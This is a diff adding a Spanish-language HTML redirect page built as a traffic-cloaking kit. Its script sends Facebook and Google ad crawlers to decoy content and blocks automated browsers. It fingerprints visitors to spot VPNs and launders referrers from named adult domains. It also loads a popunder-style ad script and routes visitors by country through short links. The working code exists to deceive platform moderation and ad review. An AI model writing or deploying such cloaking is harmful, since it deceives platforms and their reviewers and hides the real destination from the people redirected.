@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="referrer" content="no-referrer">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Redirigiendo...</title>
+    
+    <script>
+        // Configuración global: MODO REDIRECCIÓN INSTANTÁNEA
+        // ON = Redirección instantánea sin mostrar spinner ni script
+        // OFF = Modo normal con spinner, script y delay
+        window.INSTANT_REDIRECT_MODE = 'OFF'; // Cambiar a 'OFF' para desactivar modo instantáneo
+        
+        // 🛡️ BLOQUEO PARA BOTS DE FACEBOOK: Detectar y bloquear scripts cuando Facebook escanea
+        function isFacebookBot() {
+            var userAgent = navigator.userAgent || '';
+            return (
+                userAgent.indexOf('facebookexternalhit') !== -1 ||
+                userAgent.indexOf('Facebot') !== -1 ||
+                userAgent.indexOf('facebook') !== -1 ||
+                userAgent.indexOf('Meta') !== -1
+            );
+        }
+        
+        // Cargar script de anuncio solo si NO está en modo instantáneo Y NO es bot de Facebook
+        if (window.INSTANT_REDIRECT_MODE !== 'ON' && !isFacebookBot()) {
+            var adScript = document.createElement('script');
+            adScript.type = 'text/javascript';
+            adScript.src = '//pl28132683.effectivegatecpm.com/58/35/8a/58358ac784cd7dc03ce49fe63419b15a.js';
+            document.head.appendChild(adScript);
+        }
+    </script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: #f5f5f5;
+            padding: 20px;
+            overflow: hidden;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 40px;
+        }
+        .loading-section {
+            text-align: center;
+            padding: 30px;
+            background: #f9f9f9;
+            border-radius: 8px;
+            margin-top: 30px;
+        }
+        .spinner {
+            border: 4px solid rgba(102, 126, 234, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #667eea;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #667eea;
+            font-weight: 500;
+            margin-top: 10px;
+        }
+    </style>
+    
+    <script>
+        // ============================================
+        // FUNCIÓN PARA GENERAR TOKEN ALEATORIO
+        // ============================================
+        function generateRandomCode(length) {
+            var characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            var char_length = characters.length;
+            var random_code = '';
+            
+            // Usar crypto.getRandomValues si está disponible (más seguro)
+            if (window.crypto && window.crypto.getRandomValues) {
+                var randomArray = new Uint32Array(length);
+                window.crypto.getRandomValues(randomArray);
+                for (var i = 0; i < length; i++) {
+                    random_code += characters[randomArray[i] % char_length];
+                }
+            } else {
+                // Fallback para navegadores antiguos
+                for (var i = 0; i < length; i++) {
+                    random_code += characters[Math.floor(Math.random() * char_length)];
+                }
+            }
+            
+            return random_code;
+        }
+
+        // ============================================
+        // PROTECCIÓN 1: Detectar y bloquear bots
+        // ============================================
+        var userAgent = navigator.userAgent || '';
+        
+        // Bloquear bots de Facebook
+        if (/facebook(external)?/i.test(userAgent)) {
+            var short_urlx2 = "https://facebook.com/profile.php?token=" + generateRandomCode(20);
+            window.location.replace(short_urlx2);
+            throw new Error('Facebook bot detected');
+        }
+        
+        // Bloquear bots de Google (crawlers de AdSense)
+        if (/googlebot|adsbot|mediapartners|adsbot-google/i.test(userAgent)) {
+            document.body.innerHTML = '<!DOCTYPE html><html><head><title>xreels.org - Contenido</title></head><body><p>Bienvenido a xreels.org</p></body></html>';
+            throw new Error('Google bot detected');
+        }
+        
+        // Bloquear otros bots conocidos (solo si NO es un navegador)
+        var isBrowser = /mozilla|chrome|safari|firefox|edge|opera|msie|trident|webkit/i.test(userAgent);
+        if (!isBrowser && /bot|crawler|spider|scraper|curl|wget|python-requests|java|perl|ruby|httpclient/i.test(userAgent)) {
+            document.body.innerHTML = '<p>Access Denied</p>';
+            throw new Error('Bot detected');
+        }
+        
+        // Detectar bots adicionales (webdriver, phantom, nightmare)
+        if (navigator.webdriver || window.phantom || window.__nightmare) {
+            document.body.innerHTML = '<p>Acceso no disponible</p>';
+            throw new Error('Bot detected');
+        }
+
+        // ============================================
+        // PROTECCIÓN 2: Detectar si viene de sitio adulto
+        // ============================================
+        var adultDomains = [
+            'zvideosx.com',
+            'fullvideox.com'
+        ];
+        
+        var referrer = document.referrer || '';
+        var needsCleaning = false;
+        
+        // Verificar si viene de un sitio adulto
+        if (referrer) {
+            for (var i = 0; i < adultDomains.length; i++) {
+                if (referrer.indexOf(adultDomains[i]) !== -1) {
+                    needsCleaning = true;
+                    break;
+                }
+            }
+        }
+
+        // ============================================
+        // PROTECCIÓN 3: Limpieza de parámetros URL
+        // ============================================
+        if (window.history && window.history.replaceState) {
+            var cleanUrl = window.location.pathname;
+            var params = new URLSearchParams(window.location.search);
+            var allowedParams = ['id', 'page', 'view'];
+            var cleanParams = new URLSearchParams();
+            
+            params.forEach(function(value, key) {
+                if (!/utm_|ref|source|referrer|fbclid|gclid|_ga/i.test(key)) {
+                    if (allowedParams.indexOf(key) !== -1) {
+                        cleanParams.set(key, value);
+                    }
+                }
+            });
+            
+            var cleanQuery = cleanParams.toString();
+            if (cleanQuery) {
+                cleanUrl += '?' + cleanQuery;
+            }
+            
+            window.history.replaceState(null, null, cleanUrl);
+        }
+
+        // ============================================
+        // PROTECCIÓN 4: Detección VPN/PROXY MEJORADA
+        // ============================================
+        function detectVPNProxy() {
+            var vpnScore = 0;
+            var maxScore = 0;
+            var indicators = [];
+            
+            // Indicador 1: Verificar propiedades del navegador que suelen estar ausentes en VPNs
+            maxScore += 2;
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                vpnScore += 1;
+                indicators.push('mediaDevices');
+            }
+            if (!navigator.permissions || typeof navigator.permissions.query !== 'function') {
+                vpnScore += 1;
+                indicators.push('permissions');
+            }
+            
+            // Indicador 2: Verificar plugins (VPNs suelen tener menos plugins)
+            maxScore += 1;
+            if (navigator.plugins && navigator.plugins.length === 0) {
+                vpnScore += 1;
+                indicators.push('noPlugins');
+            }
+            
+            // Indicador 3: Verificar hardwareConcurrency (VPNs pueden tener valores anómalos)
+            maxScore += 1;
+            if (navigator.hardwareConcurrency) {
+                if (navigator.hardwareConcurrency < 2 || navigator.hardwareConcurrency > 16) {
+                    vpnScore += 1;
+                    indicators.push('hardwareConcurrency');
+                }
+            }
+            
+            // Indicador 4: Verificar deviceMemory (si está disponible)
+            maxScore += 1;
+            if (navigator.deviceMemory) {
+                if (navigator.deviceMemory < 2 || navigator.deviceMemory > 16) {
+                    vpnScore += 1;
+                    indicators.push('deviceMemory');
+                }
+            }
+            
+            // Indicador 5: Verificar timezone offset (VPNs pueden tener offsets inconsistentes)
+            maxScore += 1;
+            var timezoneOffset = new Date().getTimezoneOffset();
+            var expectedOffset = -new Date().getTimezoneOffset(); // Convertir a minutos desde UTC
+            // Verificar si el offset es muy inusual (más de 12 horas de diferencia)
+            if (Math.abs(timezoneOffset) > 720) {
+                vpnScore += 1;
+                indicators.push('timezone');
+            }
+            
+            // Indicador 6: Verificar si hay inconsistencias en el user agent
+            maxScore += 1;
+            var ua = navigator.userAgent.toLowerCase();
+            var platform = navigator.platform.toLowerCase();
+            // Verificar si el user agent menciona un sistema operativo diferente al platform
+            if ((ua.indexOf('windows') !== -1 && platform.indexOf('win') === -1) ||
+                (ua.indexOf('mac') !== -1 && platform.indexOf('mac') === -1) ||
+                (ua.indexOf('linux') !== -1 && platform.indexOf('linux') === -1 && platform.indexOf('x11') === -1)) {
+                vpnScore += 1;
+                indicators.push('platformMismatch');
+            }
+            
+            // Indicador 7: Verificar canvas fingerprint (VPNs pueden tener fingerprints anómalos)
+            maxScore += 1;
+            try {
+                var canvas = document.createElement('canvas');
+                var ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('VPN Detection Test', 2, 2);
+                var fingerprint = canvas.toDataURL();
+                // Si el fingerprint es muy corto o muy largo, puede ser sospechoso
+                if (fingerprint.length < 100 || fingerprint.length > 10000) {
+                    vpnScore += 1;
+                    indicators.push('canvasFingerprint');
+                }
+            } catch(e) {
+                // Si no se puede crear canvas, puede ser VPN
+                vpnScore += 1;
+                indicators.push('canvasError');
+            }
+            
+            // Calcular porcentaje de probabilidad
+            var probability = maxScore > 0 ? (vpnScore / maxScore) * 100 : 0;
+            
+            // Solo considerar VPN si hay al menos 3 indicadores y probabilidad > 50%
+            // Esto evita falsos positivos
+            return {
+                isVPN: (vpnScore >= 3 && probability > 50),
+                score: vpnScore,
+                maxScore: maxScore,
+                probability: probability,
+                indicators: indicators
+            };
+        }
+        
+        // Ejecutar detección de VPN/Proxy
+        var vpnDetection = detectVPNProxy();
+        
+        // Solo redirigir si hay alta probabilidad de VPN (más del 60% y al menos 3 indicadores)
+        if (vpnDetection.isVPN && vpnDetection.probability > 60) {
+            window.location.href = "https://google.com";
+            throw new Error('VPN detected');
+        }
+
+        // ============================================
+        // PROTECCIÓN 5: Limpieza de cookies, localStorage y sessionStorage
+        // ============================================
+        // Limpiar cookies de referrer
+        if (document.cookie) {
+            document.cookie.split(";").forEach(function(c) {
+                if (c.indexOf('referrer') !== -1 || c.indexOf('utm_') !== -1) {
+                    var cookieName = c.split('=')[0].trim();
+                    document.cookie = cookieName + "=;expires=" + new Date(0).toUTCString() + ";path=/";
+                }
+            });
+        }
+        
+        // Limpiar localStorage y sessionStorage de datos sospechosos
+        try {
+            if (localStorage && localStorage.length > 0) {
+                Object.keys(localStorage).forEach(function(key) {
+                    if (key.indexOf('referrer') !== -1 || key.indexOf('source') !== -1) {
+                        localStorage.removeItem(key);
+                    }
+                });
+            }
+            if (sessionStorage && sessionStorage.length > 0) {
+                Object.keys(sessionStorage).forEach(function(key) {
+                    if (key.indexOf('referrer') !== -1 || key.indexOf('source') !== -1) {
+                        sessionStorage.removeItem(key);
+                    }
+                });
+            }
+        } catch(e) {}
+
+        // ============================================
+        // CONFIGURACIÓN: MODO REDIRECCIÓN INSTANTÁNEA
+        // ============================================
+        // La constante se define en el <head> como window.INSTANT_REDIRECT_MODE
+        // ON = Redirección instantánea sin mostrar spinner ni script
+        // OFF = Modo normal con spinner, script y delay
+
+        // ============================================
+        // CONFIGURACIÓN DE ENLACES POR PAÍS
+        // ============================================
+        const countryLinks = {
+            'US': 'https://t.co/DRH8DBYAC9',
+            'CA': 'https://t.co/DRH8DBYAC9',
+            'MX': 'https://t.co/J9kF7NnkT2',
+            'CO': 'https://t.co/gpr7xrCFDk',
+            'DEFAULT': 'https://t.co/y5IrJWOLzN'
+        };
+
+        // ============================================
+        // CONFIGURACIÓN DE CONTADORES POR PAÍS
+        // ============================================
+        // Todos usan el mismo contador 'norieldev' pero con títulos diferentes
+        const COUNTER_KEY = 'norieldev';
+
+        // Mapeo de países a títulos
+        const countryTitles = {
+            'US': 'NORIEL DEV USA',
+            'CA': 'NORIEL DEV CA',
+            'MX': 'NORIEL DEV MX',
+            'CO': 'NORIEL DEV CO',
+            'DEFAULT': 'NORIEL DEV NULL'
+        };
+
+        // Mapeo de países a enlaces de banderas
+        const countryFlagLinks = {
+            'US': 'https://flagcdn.com/w320/us.png',
+            'CA': 'https://flagcdn.com/w320/ca.png',
+            'MX': 'https://flagcdn.com/w320/mx.png',
+            'CO': 'https://flagcdn.com/w320/co.png',
+            'DEFAULT': 'https://flagcdn.com/w320/un.png'
+        };
+
+        var counterLoaded = false;
+        var redirectTimer = null;
+        var minWaitTime = 1500;
+        var maxWaitTime = 3000;
+        var startTime = Date.now();
+        var redirectUrl = '#';
+        var sessionId = generateRandomCode(32);
+        var detectedCountry = 'DEFAULT';
+
+        // ============================================
+        // FUNCIÓN PARA CARGAR CONTADOR DINÁMICAMENTE
+        // ============================================
+        function loadCounter(country) {
+            // Obtener título según el país, o usar DEFAULT si no existe
+            var counterTitle = countryTitles[country] || countryTitles['DEFAULT'];
+            
+            // Obtener enlace de bandera según el país, o usar DEFAULT si no existe
+            var flagLink = countryFlagLinks[country] || countryFlagLinks['DEFAULT'];
+            
+            // Crear imagen del contador con la misma key pero título diferente y enlace de bandera
+            var counterImg = document.createElement('img');
+            counterImg.src = '//whos.amung.us/pingjs/?k=' + encodeURIComponent(COUNTER_KEY) + '&t=' + encodeURIComponent(counterTitle) + '&x=' + encodeURIComponent(flagLink);
+            counterImg.style.display = 'none';
+            counterImg.onload = function() {
+                counterLoaded = true;
+            };
+            counterImg.onerror = function() {
+                // Si falla la carga, considerar como cargado para no bloquear redirección
+                counterLoaded = true;
+            };
+            
+            // Agregar al body
+            document.body.appendChild(counterImg);
+        }
+
+        // ============================================
+        // FUNCIÓN PARA AGREGAR TOKEN A URL
+        // ============================================
+        function addTokenToUrl(url) {
+            if (!url || url === '#') return url;
+            
+            var separator = url.indexOf('?') !== -1 ? '&' : '?';
+            var token = generateRandomCode(16);
+            return url + separator + 'token=' + token + '&sid=' + sessionId + '&t=' + Date.now();
+        }
+
+        function checkCounterAndRedirect() {
+            var elapsed = Date.now() - startTime;
+            
+            if (counterLoaded && elapsed >= minWaitTime) {
+                clearTimeout(redirectTimer);
+                if (redirectUrl && redirectUrl !== '#') {
+                    var finalUrl = addTokenToUrl(redirectUrl);
+                    
+                    if (needsCleaning) {
+                        // Limpiar referrer usando replace
+                        window.location.replace(finalUrl);
+                    } else {
+                        // Tráfico directo: redirección normal
+                        window.location.href = finalUrl;
+                    }
+                }
+                return;
+            }
+            
+            if (elapsed >= maxWaitTime) {
+                clearTimeout(redirectTimer);
+                if (redirectUrl && redirectUrl !== '#') {
+                    var finalUrl = addTokenToUrl(redirectUrl);
+                    
+                    if (needsCleaning) {
+                        window.location.replace(finalUrl);
+                    } else {
+                        window.location.href = finalUrl;
+                    }
+                }
+                return;
+            }
+            
+            redirectTimer = setTimeout(checkCounterAndRedirect, 100);
+        }
+
+        fetch('/country')
+            .then(response => response.json())
+            .then(data => {
+                const country = data.country || 'XX';
+                detectedCountry = country;
+                
+                redirectUrl = countryLinks[country] || countryLinks['DEFAULT'] || '#';
+                
+                // Modo instantáneo: redirigir inmediatamente sin mostrar nada
+                if (window.INSTANT_REDIRECT_MODE === 'ON') {
+                    if (redirectUrl && redirectUrl !== '#') {
+                        var finalUrl = addTokenToUrl(redirectUrl);
+                        if (needsCleaning) {
+                            window.location.replace(finalUrl);
+                        } else {
+                            window.location.href = finalUrl;
+                        }
+                        return;
+                    } else {
+                        document.body.innerHTML = '<h1>404 - Página no encontrada</h1><p>País: ' + country + '</p>';
+                        return;
+                    }
+                }
+                
+                // Modo normal: cargar contador y mostrar spinner
+                // Pasar el país directamente para que use el título correspondiente
+                loadCounter(country);
+                
+                if (redirectUrl && redirectUrl !== '#') {
+                    setTimeout(function() {
+                        checkCounterAndRedirect();
+                    }, 500);
+                } else {
+                    document.body.innerHTML = '<h1>404 - Página no encontrada</h1><p>País: ' + country + '</p>';
+                }
+            })
+            .catch(error => {
+                detectedCountry = 'DEFAULT';
+                redirectUrl = countryLinks['DEFAULT'] || '#';
+                
+                // Modo instantáneo: redirigir inmediatamente sin mostrar nada
+                if (window.INSTANT_REDIRECT_MODE === 'ON') {
+                    if (redirectUrl && redirectUrl !== '#') {
+                        var finalUrl = addTokenToUrl(redirectUrl);
+                        if (needsCleaning) {
+                            window.location.replace(finalUrl);
+                        } else {
+                            window.location.href = finalUrl;
+                        }
+                        return;
+                    } else {
+                        document.body.innerHTML = '<h1>Error al detectar país</h1>';
+                        return;
+                    }
+                }
+                
+                // Modo normal: cargar contador por defecto
+                loadCounter('DEFAULT');
+                
+                if (redirectUrl && redirectUrl !== '#') {
+                    setTimeout(function() {
+                        checkCounterAndRedirect();
+                    }, 500);
+                } else {
+                    document.body.innerHTML = '<h1>Error al detectar país</h1>';
+                }
+            });
+
+        // Timeout de seguridad solo en modo normal
+        if (window.INSTANT_REDIRECT_MODE !== 'ON') {
+            setTimeout(function() {
+                if (redirectTimer) {
+                    clearTimeout(redirectTimer);
+                }
+                if (redirectUrl && redirectUrl !== '#') {
+                    var finalUrl = addTokenToUrl(redirectUrl);
+                    if (needsCleaning) {
+                        window.location.replace(finalUrl);
+                    } else {
+                        window.location.href = finalUrl;
+                    }
+                }
+            }, maxWaitTime + 500);
+        }
+    </script>
+</head>
+<body>
+    <div class="container" id="loadingContainer" style="display: none;">
+        <div class="loading-section">
+            <div class="spinner"></div>
+            <p class="loading-text">Redirigiendo...</p>
+        </div>
+    </div>
+    <script>
+        // Mostrar contenedor solo si NO está en modo instantáneo
+        if (typeof window.INSTANT_REDIRECT_MODE !== 'undefined' && window.INSTANT_REDIRECT_MODE !== 'ON') {
+            document.getElementById('loadingContainer').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
